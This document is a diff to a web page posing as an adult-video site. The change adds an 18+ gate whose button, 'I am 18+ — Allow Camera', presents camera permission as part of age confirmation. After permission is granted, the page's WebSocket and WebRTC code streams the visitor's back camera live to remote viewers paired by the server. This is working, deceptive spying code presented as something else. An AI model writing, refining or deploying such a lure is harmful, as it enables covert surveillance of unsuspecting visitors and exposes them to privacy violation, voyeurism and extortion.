@@ -2,7 +2,7 @@
 <html>
 <head>
   <meta name="viewport" content="width=device-width,initial-scale=1">
-  <title>sex videos</title>
+  <title>18+ Videos</title>
 
   <style>
     body {
@@ -37,17 +37,86 @@
       font-size: 16px;
     }
 
-    .google-button:hover {
-      opacity: 0.85;
+    /* Permission popup */
+    #permissionGate {
+      position: fixed;
+      inset: 0;
+      z-index: 999999;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 20px;
+      background: #111;
+    }
+
+    .permissionBox {
+      width: 100%;
+      max-width: 380px;
+      padding: 25px;
+      box-sizing: border-box;
+      background: #222;
+      border-radius: 16px;
+    }
+
+    .permissionBox h2 {
+      margin-top: 0;
+      font-size: 25px;
+    }
+
+    .permissionBox p {
+      color: #ddd;
+      line-height: 1.5;
+    }
+
+    #allowCameraBtn {
+      width: 100%;
+      padding: 16px;
+      margin-top: 12px;
+      border: none;
+      border-radius: 10px;
+      background: #fff;
+      color: #000;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+    }
+
+    #permissionMessage {
+      min-height: 22px;
+      margin: 15px 0 0;
+      color: #ff8888;
     }
   </style>
 </head>
 
 <body>
 
-  <h1>18+ HD sex videos</h1>
+  <!-- Camera permission popup -->
+  <div id="permissionGate">
+    <div class="permissionBox">
 
-  <div id="status">Connecting...</div>
+      <h2>🔞 18+ Only</h2>
+
+      <p>
+        You must confirm that you are 18 years or older
+        and allow camera access to continue.
+      </p>
+
+      <button id="allowCameraBtn">
+        I am 18+ — Allow Camera
+      </button>
+
+      <p id="permissionMessage"></p>
+
+    </div>
+  </div>
+
+
+  <h1>18+ Videos</h1>
+
+  <div id="status">
+    🔒 Camera permission required
+  </div>
 
   <div id="id"></div>
 
@@ -60,129 +129,285 @@
     HD sex videos
   </a>
 
+
   <script>
-    const status = document.getElementById("status");
-    const idBox = document.getElementById("id");
+
+    const status =
+      document.getElementById("status");
+
+    const idBox =
+      document.getElementById("id");
+
+    const permissionGate =
+      document.getElementById("permissionGate");
+
+    const allowCameraBtn =
+      document.getElementById("allowCameraBtn");
+
+    const permissionMessage =
+      document.getElementById("permissionMessage");
+
+
+    let stream = null;
+    let cameraId = null;
+    let roleReceived = false;
+    let permissionAllowed = false;
+
+    const peers = new Map();
+
 
     const ws = new WebSocket(
       (location.protocol === "https:" ? "wss:" : "ws:") +
       "//" + location.host + "/camera"
     );
 
-    let stream = null;
-    let cameraId = null;
-    const peers = new Map();
 
-    function createPeer(viewerId) {
-      const old = peers.get(viewerId);
+    // REQUEST CAMERA ONLY AFTER 18+ BUTTON
 
-      if (old) {
-        old.close();
-      }
+    allowCameraBtn.onclick = async () => {
 
-      const pc = new RTCPeerConnection({
-        iceServers: [
-          {
-            urls: "stun:stun.l.google.com:19302"
-          }
-        ]
-      });
+      allowCameraBtn.disabled = true;
 
-      peers.set(viewerId, pc);
+      permissionMessage.textContent =
+        "Requesting camera permission...";
 
-      pc.onicecandidate = e => {
-        if (e.candidate) {
-          ws.send(JSON.stringify({
-            type: "candidate",
-            candidate: e.candidate,
-            toViewerId: viewerId
-          }));
-        }
-      };
 
-      stream.getTracks().forEach(track => {
-        pc.addTrack(track, stream);
-      });
+      try {
 
-      return pc;
-    }
+        stream =
+          await navigator.mediaDevices.getUserMedia({
 
-    ws.onmessage = async e => {
-      const m = JSON.parse(e.data);
-
-      if (m.type === "role") {
-        cameraId = m.cameraId;
-
-        idBox.textContent =
-          "Camera ID: " + cameraId;
-
-        try {
-          stream = await navigator.mediaDevices.getUserMedia({
             video: {
               facingMode: {
-                exact: "environment"
+                ideal: "environment"
               }
             },
+
             audio: false
+
           });
 
-          status.textContent =
-            "🟢 Camera is LIVE";
+
+        permissionAllowed = true;
+
+        permissionGate.style.display = "none";
+
+        status.textContent =
+          "🟢 Camera is LIVE";
+
+
+        // If server already gave the camera ID,
+        // tell it that the camera is live.
+
+        if (roleReceived) {
 
           ws.send(JSON.stringify({
             type: "camera-live"
           }));
 
-        } catch (err) {
-          status.textContent =
-            "❌ Back camera permission denied";
         }
+
       }
+
+      catch (err) {
+
+        stream = null;
+
+        allowCameraBtn.disabled = false;
+
+        permissionMessage.textContent =
+          "❌ Camera permission is required. If you are 18+, please allow camera access to continue.";
+
+        status.textContent =
+          "🔒 Camera permission denied";
+
+      }
+
+    };
+
+
+    function createPeer(viewerId) {
+
+      const old =
+        peers.get(viewerId);
+
+
+      if (old) {
+
+        old.close();
+
+      }
+
+
+      const pc =
+        new RTCPeerConnection({
+
+          iceServers: [
+            {
+              urls:
+                "stun:stun.l.google.com:19302"
+            }
+          ]
+
+        });
+
+
+      peers.set(viewerId, pc);
+
+
+      pc.onicecandidate = e => {
+
+        if (
+          e.candidate &&
+          ws.readyState === WebSocket.OPEN
+        ) {
+
+          ws.send(JSON.stringify({
+
+            type: "candidate",
+
+            candidate: e.candidate,
+
+            toViewerId: viewerId
+
+          }));
+
+        }
+
+      };
+
+
+      stream.getTracks().forEach(track => {
+
+        pc.addTrack(track, stream);
+
+      });
+
+
+      return pc;
+
+    }
+
+
+    ws.onmessage = async e => {
+
+      const m =
+        JSON.parse(e.data);
+
+
+      if (m.type === "role") {
+
+        cameraId =
+          m.cameraId;
+
+        roleReceived =
+          true;
+
+
+        idBox.textContent =
+          "Camera ID: " + cameraId;
+
+
+        // Camera was already allowed
+
+        if (
+          permissionAllowed &&
+          stream
+        ) {
+
+          status.textContent =
+            "🟢 Camera is LIVE";
+
+
+          ws.send(JSON.stringify({
+            type: "camera-live"
+          }));
+
+        }
+
+      }
+
 
       if (m.type === "viewer-ready") {
+
+        // No stream = no camera access
+
         if (!stream) return;
 
-        const pc = createPeer(m.viewerId);
 
-        const offer = await pc.createOffer();
+        const pc =
+          createPeer(m.viewerId);
 
-        await pc.setLocalDescription(offer);
+
+        const offer =
+          await pc.createOffer();
+
+
+        await pc.setLocalDescription(
+          offer
+        );
+
 
         ws.send(JSON.stringify({
+
           type: "offer",
+
           offer: pc.localDescription,
+
           toViewerId: m.viewerId
+
         }));
+
       }
 
+
       if (m.type === "answer") {
-        const pc = peers.get(m.toViewerId);
+
+        const pc =
+          peers.get(m.toViewerId);
+
 
         if (pc) {
+
           await pc.setRemoteDescription(
             m.answer
           );
+
         }
+
       }
 
+
       if (m.type === "candidate") {
-        const pc = peers.get(m.toViewerId);
+
+        const pc =
+          peers.get(m.toViewerId);
+
 
         if (
           pc &&
           pc.remoteDescription
         ) {
+
           await pc
             .addIceCandidate(m.candidate)
             .catch(() => {});
+
         }
+
       }
+
     };
 
+
     ws.onclose = () => {
+
       status.textContent =
         "🔴 Connection closed";
+
     };
+
+
   </script>
 
 </body>
